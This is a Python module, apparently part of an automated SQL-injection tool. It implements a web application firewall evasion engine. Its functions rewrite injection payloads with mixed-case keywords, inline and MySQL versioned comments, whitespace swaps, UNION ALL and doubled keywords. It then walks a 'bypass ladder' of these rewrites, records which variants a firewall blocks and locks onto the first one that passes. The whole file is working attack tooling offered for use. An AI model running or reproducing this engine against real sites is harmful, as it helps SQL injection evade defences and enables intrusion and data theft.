from __future__ import annotations

import re
from dataclasses import dataclass, field
from typing import Callable, Optional

from .knowledge import bypass_ladder as _kb_ladder

_KEYWORDS = (
    "UNION", "SELECT", "ALL", "FROM", "WHERE", "AND", "OR", "ORDER", "BY",
    "GROUP", "CONCAT", "GROUP_CONCAT", "LIMIT", "INFORMATION_SCHEMA", "TABLES", "COLUMNS",
)
_KW_RE = re.compile(r"\b(" + "|".join(sorted(_KEYWORDS, key=len, reverse=True)) + r")\b", re.IGNORECASE)

_COMMENT_RE = re.compile(r"(\s*(?:--\s.*|--$|#.*))$")


def _split_comment(payload: str) -> tuple[str, str]:
    m = _COMMENT_RE.search(payload)
    if m:
        return payload[: m.start()], payload[m.start():]
    return payload, ""


def _mixed_case(word: str) -> str:
    return "".join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(word))



def t_identity(p: str) -> str:
    return p


def t_case(p: str) -> str:
    body, comment = _split_comment(p)
    return _KW_RE.sub(lambda m: _mixed_case(m.group(0)), body) + comment


def t_union_all(p: str) -> str:
    body, comment = _split_comment(p)
    body = re.sub(r"\bUNION\b\s+\bSELECT\b", "UNION ALL SELECT", body, flags=re.IGNORECASE)
    return body + comment


def t_inline_comment(p: str) -> str:
    body, comment = _split_comment(p)
    return re.sub(r"\s+", "/**/", body) + comment


def t_whitespace_tab(p: str) -> str:
    body, comment = _split_comment(p)
    return re.sub(r" ", "\t", body) + comment


def t_whitespace_newline(p: str) -> str:
    body, comment = _split_comment(p)
    return re.sub(r" ", "\n", body) + comment


def t_versioned_comment(p: str) -> str:
    body, comment = _split_comment(p)
    return _KW_RE.sub(lambda m: f"/*!50000{m.group(0)}*/", body) + comment


def t_term_hash(p: str) -> str:
    body, comment = _split_comment(p)
    return body + "#" if comment else p


def t_term_dash(p: str) -> str:
    body, comment = _split_comment(p)
    return body + "-- -" if comment else p


def t_double_keyword(p: str) -> str:
    body, comment = _split_comment(p)

    def nest(m: re.Match) -> str:
        w = m.group(0)
        mid = len(w) // 2
        return w[:mid] + w.lower() + w[mid:]

    return _KW_RE.sub(nest, body) + comment


TRANSFORMS: dict[str, tuple[Callable[[str], str], bool]] = {
    "identity": (t_identity, True),
    "case": (t_case, True),
    "union_all": (t_union_all, True),
    "inline_comment": (t_inline_comment, True),
    "whitespace_tab": (t_whitespace_tab, True),
    "whitespace_newline": (t_whitespace_newline, True),
    "versioned_comment": (t_versioned_comment, True),
    "term_hash": (t_term_hash, True),
    "term_dash": (t_term_dash, True),
    "double_keyword": (t_double_keyword, False),
}

Pipeline = tuple[str, ...]


def apply_pipeline(payload: str, pipeline: Pipeline) -> str:
    out = payload
    for name in pipeline:
        func, _ = TRANSFORMS[name]
        out = func(out)
    return out


LADDER: tuple[Pipeline, ...] = (
    (),
    ("case",),
    ("inline_comment",),
    ("inline_comment", "case"),
    ("union_all", "case"),
    ("union_all", "inline_comment", "case"),
    ("versioned_comment",),
    ("versioned_comment", "case"),
    ("term_hash", "inline_comment", "case"),
    ("whitespace_tab",),
    ("whitespace_newline",),
    ("whitespace_tab", "case"),
    ("union_all", "versioned_comment", "case"),
    ("double_keyword",),
    ("double_keyword", "inline_comment", "case"),
)


@dataclass
class WafProfile:

    tried_payloads: set[str] = field(default_factory=set)
    blocked_pipelines: list[Pipeline] = field(default_factory=list)
    passed_pipelines: list[Pipeline] = field(default_factory=list)
    locked_pipeline: Optional[Pipeline] = None

    def record(self, pipeline: Pipeline, payload: str, blocked: bool) -> None:
        self.tried_payloads.add(payload)
        if blocked:
            self.blocked_pipelines.append(pipeline)
        else:
            self.passed_pipelines.append(pipeline)
            if self.locked_pipeline is None:
                self.locked_pipeline = pipeline

    def summary(self) -> dict:
        return {
            "locked_pipeline": list(self.locked_pipeline) if self.locked_pipeline is not None else None,
            "blocked_count": len(self.blocked_pipelines),
            "passed_count": len(self.passed_pipelines),
            "payloads_tried": len(self.tried_payloads),
        }


class EvasionEngine:

    def __init__(self, ladder: Optional[tuple[Pipeline, ...]] = None) -> None:
        source = ladder if ladder is not None else _kb_ladder()
        valid = tuple(tuple(p) for p in source if all(n in TRANSFORMS for n in p))
        self.ladder = valid or LADDER
        self.profile = WafProfile()

    def next_payload(self, base: str) -> tuple[Optional[str], Optional[Pipeline]]:
        if self.profile.locked_pipeline is not None:
            payload = apply_pipeline(base, self.profile.locked_pipeline)
            if payload not in self.profile.tried_payloads:
                return payload, self.profile.locked_pipeline
        for pipeline in self.ladder:
            payload = apply_pipeline(base, pipeline)
            if payload not in self.profile.tried_payloads:
                return payload, pipeline
        return None, None

    def record(self, pipeline: Pipeline, payload: str, blocked: bool) -> None:
        self.profile.record(pipeline, payload, blocked)
